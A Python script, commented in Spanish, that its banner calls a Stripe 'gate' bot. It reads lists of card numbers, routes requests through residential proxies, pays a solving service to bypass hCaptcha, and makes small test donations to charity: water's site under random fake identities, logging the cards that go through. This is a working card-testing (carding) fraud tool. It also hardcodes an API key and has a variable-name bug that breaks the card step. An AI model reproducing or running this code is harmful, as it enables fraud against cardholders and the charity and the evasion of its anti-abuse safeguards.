import requests
import json
import re
import time
import random
import datetime
import os
import sys
import threading
import uuid
from typing import Optional
from twocaptcha import TwoCaptcha
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console
from rich.text import Text
from rich.panel import Panel
from rich.align import Align
console = Console()
file_lock = threading.Lock()
counters_lock = threading.Lock()

start_time = None
stop_flag = threading.Event()
consecutive_errors = 0
MAX_CONSECUTIVE_ERRORS = 5
consecutive_captcha_errors = 0

TIMEOUT_CAPTCHA = (5, 20)
TIMEOUT_STRIPE = (5, 25)
TIMEOUT_WEBPAGE = (5, 15)

STRIPE_PK = "pk_live_51049Hm4QFaGycgRKOIbupRw7rf65FJESmPqWZk9Jtpf2YCvxnjMAFX7dOPAgoxv9M2wwhi5OwFBx1EzuoTxNzLJD00ViBbMvkQ"
TWO_CAPTCHA_API_KEY = "30d75186e63a96b635959c5e854e1fab"
HCAPTCHA_SITEKEY = "a5f74b19-9e45-40e0-b45d-47ff91b7a6c2"
HCAPTCHA_URL = "https://www.charitywater.org/donate"
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'

FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia", "Jennifer", "Linda"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]

captcha_stats = {
    "total_attempts": 0,
    "successful": 0,
    "failed": 0,
    "avg_solve_time": 0,
    "total_solve_time": 0
}

# ==================== PROXY (IPRoyal vía .env / iproyal.py) ====================

def get_gate_proxy() -> Optional[str]:
    """Devuelve el proxy sticky MX del gate (IPRoyal), leído del .env."""
    try:
        _ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        if _ROOT not in sys.path:
            sys.path.insert(0, _ROOT)
        from bot.services.proxies import gate_proxy
        proxy = gate_proxy("mx")
    except Exception as e:
        console.print(f"[red]✗ Error obteniendo proxy del gate: {e}[/red]")
        proxy = None
    if not proxy:
        console.print("[yellow]Sin proxy configurado (IPRoyal). Se aborta el flujo.[/yellow]")
        return None
    return proxy


def make_session(proxy: Optional[str] = None) -> requests.Session:
    """Sesión requests con el proxy del gate (si existe)."""
    session = requests.Session()
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
    return session

# ==================== FUNCIONES AUXILIARES ====================

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_banner(proxy: Optional[str] = None):
    t = Text(justify="center")
    t.append("\n")
    t.append("█▀█ █   █ █▀▄▀█ █▀█ █▀█   █▄▄ █ █▄ █ █▀\n", style="bold red")
    t.append("█▄█ █▄▄ █ █ ▀ █ █▀▀ █▄█   █▄█ █ █ ▀█ ▄█\n", style="bold red")
    t.append("\n")
    t.append("      BOT DEV BY @MrMxyzptlk04\n", style="bold red")
    t.append("        GATE STRIPE - Con Proxy IPRoyal (sticky MX)\n", style="dim red")
    t.append(f"        🌐 Proxy: {proxy or 'sin proxy'}\n", style="cyan")
    return Panel(Align.center(t), border_style="red", padding=(1, 4))

def write_to_file(filename, line):
    with file_lock:
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(line + '\n')

def parse_x(text, start, end):
    try:
        s = text.index(start) + len(start)
        e = text.index(end, s)
        return text[s:e]
    except ValueError:
        return "None"

# ==================== FUNCIONES DE CAPTCHA ====================

def solve_hcaptcha_via_api(page_url):
    """Resolver hCaptcha usando 2Captcha API"""
    captcha_stats["total_attempts"] += 1
    
    solver = TwoCaptcha(TWO_CAPTCHA_API_KEY)
    try:
        start = time.time()
        result = solver.hcaptcha(
            sitekey=HCAPTCHA_SITEKEY,
            url=page_url,
            invisible=0
        )
        solve_time = time.time() - start
        
        captcha_stats["successful"] += 1
        captcha_stats["total_solve_time"] += solve_time
        captcha_stats["avg_solve_time"] = captcha_stats["total_solve_time"] / captcha_stats["successful"]
        
        console.print(f"[green]✓ Captcha resuelto en {solve_time:.2f}s[/green]")
        return result['code']
    except Exception as e:
        captcha_stats["failed"] += 1
        console.print(f"[red]✗ Error resolviendo captcha: {e}[/red]")
        return None

# ==================== FUNCIONES DE STRIPE ====================

def get_stripe_token(card, email, name):
    """Obtener token de Stripe usando el proxy del gate"""
    card_number, exp_month, exp_year, cvv = card.split('|')

    # Usar el proxy del gate para acceder a la API de Stripe
    stripe_url = "https://api.stripe.com/v1/tokens"
    
    headers = {
        "User-Agent": UA,
        "Content-Type": "application/x-www-form-urlencoded",
        "Authorization": f"Bearer {STRIPE_PK}"
    }
    
    data = {
        "card[number]": card_number,
        "card[exp_month]": exp_month,
        "card[exp_year]": exp_year,
        "card[cvc]": cvc,
        "card[name]": name,
        "card[address_zip]": str(random.randint(10000, 99999)),
        "guid": str(uuid.uuid4()),
        "muid": str(uuid.uuid4()),
        "sid": str(uuid.uuid4()),
        "payment_user_agent": "stripe.js/2c7b0a6f; stripe-js-v3/2c7b0a6f",
        "referrer": "https://www.charitywater.org",
        "time_on_page": str(random.randint(50000, 80000)),
        "key": STRIPE_PK
    }
    
    # Convertir datos a formato x-www-form-urlencoded
    form_data = "&".join([f"{k}={v}" for k, v in data.items()])
    
    # Usar el proxy del gate para la solicitud a Stripe
    session = make_session(get_gate_proxy())
    response = session.post(stripe_url, data=form_data, headers=headers, timeout=TIMEOUT_STRIPE[1])
    
    if response.status_code != 200:
        console.print(f"[red]✗ Error en Stripe via proxy: {response.status_code}[/red]")
        return None
    
    try:
        response_data = response.json()
        if "id" in response_data:
            console.print(f"[green]✓ Token Stripe obtenido: {response_data['id'][:10]}...[/green]")
            return response_data['id']
        else:
            error_msg = response_data.get('error', {}).get('message', 'Error desconocido')
            console.print(f"[red]✗ Error en respuesta de Stripe: {error_msg}[/red]")
            return None
    except Exception as e:
        console.print(f"[red]✗ Error parseando respuesta de Stripe: {e}[/red]")
        return None
    
    return None

def get_donation_page():
    """Obtener página de donación usando el proxy del gate"""
    session = make_session(get_gate_proxy())
    response = session.get(HCAPTCHA_URL, headers={"User-Agent": UA}, timeout=TIMEOUT_WEBPAGE[1])
    if response.status_code != 200:
        console.print(f"[red]✗ Error obteniendo página de donación: {response.status_code}[/red]")
        return None
    return response.text

def make_donation(stripe_token, amount, email, first_name, last_name):
    """Realizar donación usando el proxy del gate"""
    donate_url = "https://www.charitywater.org/api/v4/donations/one-time"
    
    headers = {
        "User-Agent": UA,
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://www.charitywater.org",
        "Referer": "https://www.charitywater.org/donate"
    }
    
    donation_data = {
        "amount": amount,
        "currency": "usd",
        "source": stripe_token,
        "email": email,
        "first_name": first_name,
        "last_name": last_name,
        "dedication": "",
        "address1": f"{random.randint(100, 999)} Main St",
        "city": "New York",
        "state": "NY",
        "zip_code": str(random.randint(10000, 99999)),
        "country": "US",
        "cover_fees": False,
        "subscribe": False,
        "campaign": "general",
        "recurring": False
    }
    
    # Usar el proxy del gate para la donación
    session = make_session(get_gate_proxy())
    response = session.post(donate_url, json=donation_data, headers=headers, timeout=TIMEOUT_STRIPE[1])

    if response.status_code != 200:
        console.print(f"[red]✗ Error en donación via proxy: {response.status_code}[/red]")
        return False

    try:
        response_data = response.json()
        if "id" in response_data:
            console.print(f"[green]✓ Donación exitosa! ID: {response_data['id']}[/green]")
            return True
        else:
            error_msg = response_data.get('message', 'Error desconocido')
            console.print(f"[red]✗ Error en donación: {error_msg}[/red]")
            return False
    except Exception as e:
        console.print(f"[red]✗ Error parseando respuesta de donación: {e}[/red]")
        return False

    return False

# ==================== FUNCIÓN PRINCIPAL DE PROCESAMIENTO ====================

def process_card(card, thread_id):
    """Procesar una tarjeta completa"""
    global consecutive_errors, consecutive_captcha_errors, stop_flag
    
    if stop_flag.is_set():
        return
    
    console.print(f"[cyan][Hilo {thread_id}] Procesando tarjeta...[/cyan]")
    
    # Generar datos aleatorios
    email = f"{random.choice(FIRST_NAMES).lower()}{random.choice(LAST_NAMES).lower()}{random.randint(100, 999)}@gmail.com"
    first_name = random.choice(FIRST_NAMES)
    last_name = random.choice(LAST_NAMES)
    full_name = f"{first_name} {last_name}"
    amount = random.choice([1, 5, 10, 20, 50, 100])
    
    try:
        # Paso 1: Obtener página de donación (con proxy)
        console.print(f"[yellow][Hilo {thread_id}] Obteniendo página de donación...[/yellow]")
        page_content = get_donation_page()
        
        if not page_content:
            consecutive_errors += 1
            if consecutive_errors >= MAX_CONSECUTIVE_ERRORS:
                console.print("[red]Máximo de errores consecutivos alcanzado. Deteniendo...[/red]")
                stop_flag.set()
            return
        
        # Paso 2: Resolver captcha si es necesario
        console.print(f"[yellow][Hilo {thread_id}] Resolviendo captcha...[/yellow]")
        captcha_token = solve_hcaptcha_via_api(HCAPTCHA_URL)
        
        if not captcha_token:
            consecutive_captcha_errors += 1
            if consecutive_captcha_errors >= 3:
                console.print("[red]Máximo de errores de captcha. Pausando...[/red]")
                time.sleep(30)
                consecutive_captcha_errors = 0
            return
        
        consecutive_captcha_errors = 0
        
        # Paso 3: Obtener token de Stripe (con proxy)
        console.print(f"[yellow][Hilo {thread_id}] Obteniendo token Stripe...[/yellow]")
        stripe_token = get_stripe_token(card, email, full_name)
        
        if not stripe_token:
            consecutive_errors += 1
            return
        
        # Paso 4: Realizar donación (con proxy)
        console.print(f"[yellow][Hilo {thread_id}] Realizando donación de ${amount}...[/yellow]")
        success = make_donation(stripe_token, amount, email, first_name, last_name)
        
        if success:
            # Guardar éxito
            log_line = f"{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | {card} | ${amount} | {email} | {full_name} | SUCCESS"
            write_to_file("success.txt", log_line)
            console.print(f"[green][Hilo {thread_id}] ✓ Donación exitosa![/green]")
            consecutive_errors = 0
        else:
            consecutive_errors += 1
            
    except Exception as e:
        console.print(f"[red][Hilo {thread_id}] ✗ Error: {str(e)}[/red]")
        consecutive_errors += 1
    
    # Verificar si se alcanzó el máximo de errores
    if consecutive_errors >= MAX_CONSECUTIVE_ERRORS:
        console.print("[red]Máximo de errores consecutivos alcanzado. Deteniendo...[/red]")
        stop_flag.set()

def load_cards(filename):
    """Cargar tarjetas desde archivo"""
    cards = []
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and '|' in line and len(line.split('|')) >= 4:
                    cards.append(line)
    except FileNotFoundError:
        console.print(f"[red]✗ Archivo {filename} no encontrado[/red]")
    return cards

def show_stats():
    """Mostrar estadísticas"""
    console.print("\n[bold cyan]📊 ESTADÍSTICAS[/bold cyan]")
    console.print(f"[cyan]Captchas: {captcha_stats['total_attempts']} intentos[/cyan]")
    console.print(f"[cyan]  ✓ Exitosos: {captcha_stats['successful']}[/cyan]")
    console.print(f"[cyan]  ✗ Fallidos: {captcha_stats['failed']}[/cyan]")
    if captcha_stats['successful'] > 0:
        console.print(f"[cyan]  ⏱️  Tiempo promedio: {captcha_stats['avg_solve_time']:.2f}s[/cyan]")
    

# ==================== FUNCIÓN PRINCIPAL ====================

def main():
    """Función principal"""
    global start_time
    
    clear_screen()
    
    # Verificar proxy del gate
    proxy = get_gate_proxy()
    if not proxy:
        console.print("[red]❌ ERROR: No se pudo obtener el proxy del gate (IPRoyal)[/red]")
        console.print("[yellow]Opciones para configurar el proxy:[/yellow]")
        console.print("1. Variable de entorno: export IPROYAL_STICKY_MX_URL='http://user:pass_country-mx_...@host:port'")
        console.print("2. Archivo .env del proyecto (variables IPROYAL_*)")
        console.print("3. Ejecutar desde la raiz del proyecto (bot.services.proxies)")
        return

    console.print(get_banner(proxy))

    # Session con proxy
    session = make_session(proxy)
    console.print(f"[green]✓ Sesión con proxy inicializada[/green]")
    
    # Cargar tarjetas
    cards = load_cards("cards.txt")
    if not cards:
        console.print("[red]✗ No se encontraron tarjetas en cards.txt[/red]")
        console.print("[yellow]Formato: 4242424242424242|12|2025|123[/yellow]")
        return
    
    console.print(f"[green]✓ {len(cards)} tarjetas cargadas[/green]")
    
    # Configurar threads
    num_threads = min(3, len(cards))  # Reducido para evitar rate limits
    console.print(f"[yellow]Usando {num_threads} hilos...[/yellow]")
    console.print("[yellow]Nota: usar delays automáticos para respetar rate limits del proxy.[/yellow]")
    
    start_time = time.time()
    
    try:
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            thread_ids = list(range(1, num_threads + 1))
            
            # Distribuir tarjetas entre threads
            for i, card in enumerate(cards):
                if stop_flag.is_set():
                    break
                
                thread_id = thread_ids[i % num_threads]
                executor.submit(process_card, card, thread_id)
                
                # Pequeño delay entre envíos para evitar rate limits
                delay = random.uniform(2.0, 4.0)
                time.sleep(delay)
        
        console.print("\n[green]✅ Procesamiento completado[/green]")
        
    except KeyboardInterrupt:
        console.print("\n[yellow]⚠️  Interrupción por usuario[/yellow]")
    except Exception as e:
        console.print(f"\n[red]❌ Error crítico: {str(e)}[/red]")
    finally:
        show_stats()
        
        if start_time:
            elapsed = time.time() - start_time
            console.print(f"\n[cyan]⏱️  Tiempo total: {elapsed:.2f} segundos[/cyan]")

if __name__ == "__main__":
    main()
